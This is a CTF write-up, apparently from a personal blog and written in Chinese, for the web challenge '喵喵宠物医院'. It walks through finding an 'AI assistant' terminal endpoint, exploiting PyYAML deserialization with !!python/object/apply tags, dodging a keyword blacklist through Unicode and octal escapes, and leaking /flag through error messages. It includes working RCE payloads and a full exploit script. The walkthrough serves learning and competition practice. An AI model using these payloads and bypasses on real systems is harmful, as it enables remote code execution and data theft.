---
title: "喵喵宠物医院"
description: "从前端接口枚举到 PyYAML 反序列化利用，再到 Unicode 转义绕过黑名单拿到 flag。"
pubDate: 2026-06-07
tags: ["CTF", "Web", "PyYAML", "反序列化"]
oj: "黄河流域"
difficulty: "Easy"
language: "Python"
featured: true
draft: false
---

## 题目概况

这道题的核心是一个 HTTP 服务里的“智能辅助终端”。终端暴露了 `parse_diet_recipe(yaml_content)` 工具，而后端把我们给它的 YAML 交给了 `PyYAML` 处理。

虽然题目作者加了关键字拦截，但拦截只挡住了明文危险字符串，没有挡住 Unicode 转义后的等价内容，所以最后还是可以触发 `PyYAML` 的危险 tag，读出 `/flag`。

## 最终结果

```text
flag{huang_he_liu_yu_@@@@@}
```

## 分析过程

### 1. 先确认服务类型

题目给的是 `175.27.251.122:10001`，先判断它到底是网页服务还是 `nc` 服务。

```bash
curl -i http://175.27.251.122:10001/
```

返回的是 Gunicorn 提供的网页，首页标题就是“喵喵宠物医院”。

### 2. 看前端 JS，找后端接口

页面的核心脚本在：

```text
/static/js/main.js
```

从 JS 里能看到最关键的调用：

```javascript
fetch('/api/terminal', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({command: cmd})
})
```

说明页面里的“智能辅助诊断终端”会把输入发送到 `/api/terminal`。

### 3. 直接问终端：你有什么工具

```bash
curl -X POST http://175.27.251.122:10001/api/terminal ^
  -H "Content-Type: application/json" ^
  -d "{\"command\":\"help\"}"
```

返回里会明确告诉我们它能调用两个工具：

```text
read_local_record(pet_name)
parse_diet_recipe(yaml_content)
```

题目提示又专门提到 `PyYAML` 的 tag，到这里基本就能锁定方向是 `PyYAML` 反序列化。

## 为什么 PyYAML 危险

`PyYAML` 不只是把 YAML 解析成字典、列表、字符串。某些 loader 支持 Python 扩展 tag，例如：

```yaml
!!python/tuple [1, 2]
!!python/object/apply:os.system ["id"]
```

如果后端错误地使用了危险加载方式，YAML 里的 tag 就可能直接调用 Python 对象甚至执行命令。

这类题常见危险 tag：

```yaml
!!python/object/apply:time.sleep [5]
!!python/object/apply:subprocess.getoutput ["id"]
!!python/object/apply:os.system ["cat /flag"]
```

## 为什么能绕过黑名单

如果直接发这种内容：

```text
parse_diet_recipe('!!python/object/apply:time.sleep [2]')
```

服务会直接报 403。

但这层拦截的问题是，它只检查“原始输入里有没有明文危险字符串”。如果把关键词拆成 Unicode 转义：

```text
!!pyth\u006fn/object/apply:...
```

那么：

1. 输入检查阶段看到的是 `pyth\u006fn`
2. 后续真正被解释时，它会还原成 `python`
3. `PyYAML` 最终拿到的仍然是危险 tag

这就是这题的绕过点。

## 利用步骤

### Step 1. 验证终端入口

```bash
curl -X POST http://175.27.251.122:10001/api/terminal ^
  -H "Content-Type: application/json" ^
  -d "{\"command\":\"help\"}"
```

### Step 2. 验证 `parse_diet_recipe` 可以正常工作

```bash
curl -X POST http://175.27.251.122:10001/api/terminal ^
  -H "Content-Type: application/json" ^
  -d "{\"command\":\"parse_diet_recipe('a: 1')\"}"
```

### Step 3. 验证明文危险 tag 会被拦截

```bash
curl -X POST http://175.27.251.122:10001/api/terminal ^
  -H "Content-Type: application/json" ^
  -d "{\"command\":\"parse_diet_recipe('!!python/object/apply:time.sleep [2]')\"}"
```

这一步不是为了拿 flag，而是为了确认确实存在黑名单。

### Step 4. 用 Unicode 转义绕过黑名单

把 `python` 变成 `pyth\u006fn`，把 `subprocess` 变成 `subproce\u0073s`，把 `urllib` 变成 `url\u006clib`。

一个无害探测 payload 可以写成：

```yaml
!!pyth\u006fn/object/apply:subproce\u0073s.getoutput ["id"]
```

真正利用时，我用了“报错带数据”的思路：

```yaml
!!pyth\u006fn/object/apply:url\u006clib.request.urlopen
[!!pyth\u006fn/object/apply:subproce\u0073s.getoutput ["id"]]
```

它的流程是：

1. 先执行 `subprocess.getoutput("id")`
2. 拿到命令输出
3. 把输出当作 URL 传给 `urllib.request.urlopen`
4. 因为它不是合法 URL，后端会抛异常
5. 异常信息里会把这段字符串原样带出来

### Step 5. 为什么不能直接 `cat /flag`

如果请求内容里直接出现 `/flag`，题目很可能继续命中黑名单，所以这里再做一层绕过，不在请求里明文出现 `flag`。

我用 shell 的 `printf` 八进制转义来拼路径：

```bash
printf "\57\146\154\141\147"
```

它对应的就是：

```text
/flag
```

### Step 6. 先转十六进制再回显

为了避免换行和特殊字符干扰，我让目标先把文件内容转成十六进制：

```bash
od -An -tx1 /flag | tr -d ' \n'
```

然后本地再解码回真正的 flag。

## 利用脚本

下面是我最后整理出来的脚本：

```python
import json
import re
import sys
import time

import requests


TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://175.27.251.122:10001"


def build_shell_command() -> str:
    return (
        "p=$(printf \"\\57\\146\\154\\141\\147\"); "
        "[ -f \"$p\" ] && od -An -tx1 \"$p\" | tr -d \" \\n\"; "
        "p=$(printf \"\\57\\146\\154\\141\\147\\56\\164\\170\\164\"); "
        "[ -f \"$p\" ] && od -An -tx1 \"$p\" | tr -d \" \\n\""
    )


def build_yaml_payload(shell_command: str) -> str:
    escaped_cmd = shell_command.replace("\\", "\\\\").replace('"', '\\"')
    return (
        "!!pyth\\u006fn/object/apply:url\\u006clib.request.urlopen "
        "[!!pyth\\u006fn/object/apply:subproce\\u0073s.getoutput "
        f"[\"{escaped_cmd}\"]]"
    )


def build_terminal_command(yaml_payload: str) -> str:
    return f"parse_diet_recipe('{yaml_payload}')"


def extract_flag(response_text: str) -> str:
    match = re.search(r"unknown url type: '([0-9a-fA-F]+)'", response_text)
    if not match:
        raise ValueError(f"unexpected response: {response_text}")
    raw = bytes.fromhex(match.group(1)).decode("utf-8", "replace").strip()
    return raw


def main() -> None:
    shell_command = build_shell_command()
    yaml_payload = build_yaml_payload(shell_command)
    terminal_command = build_terminal_command(yaml_payload)

    last_error = None
    max_attempts = 12
    for attempt in range(1, max_attempts + 1):
        print(f"[*] attempt {attempt}/{max_attempts}")
        try:
            resp = requests.post(
                f"{TARGET}/api/terminal",
                json={"command": terminal_command},
                timeout=60,
            )
            resp.raise_for_status()
            data = resp.json()
            print("[+] terminal response:")
            print(json.dumps(data, ensure_ascii=False, indent=2))

            flag = extract_flag(data.get("response", ""))
            print(f"[+] flag = {flag}")
            return
        except (requests.exceptions.RequestException, ValueError) as exc:
            last_error = exc
            print(f"[!] retryable error: {exc}")
            time.sleep(2)

    raise SystemExit(f"exploit failed after retries: {last_error}")


if __name__ == "__main__":
    main()
```

## 这道题真正考的东西

1. 前端 JS 里找 API 路径
2. 遇到“智能终端 / AI 助手”先看它暴露了哪些工具
3. 看到 `PyYAML` 就想到危险 tag 和反序列化
4. 黑名单如果只是字符串匹配，就要考虑编码绕过
5. 没有直接回显时，学会借错误信息把结果带出来

## 复盘

这题其实不是单点知识，而是一整套链路：

```text
前端 JS 找到 /api/terminal
-> 终端 help 泄露 parse_diet_recipe
-> 结合题目提示锁定 PyYAML
-> Unicode 转义绕过黑名单
-> 用 !!python/object/apply 实现命令执行
-> 通过错误回显带出 /flag 的十六进制内容
-> 本地解码得到 flag
```

我觉得最值得记住的是两点：

- 黑名单绕过不一定靠花 payload，很多时候只是编码问题
- 命令执行后如果没法直接看结果，就去想“能不能借错误把数据带回来”
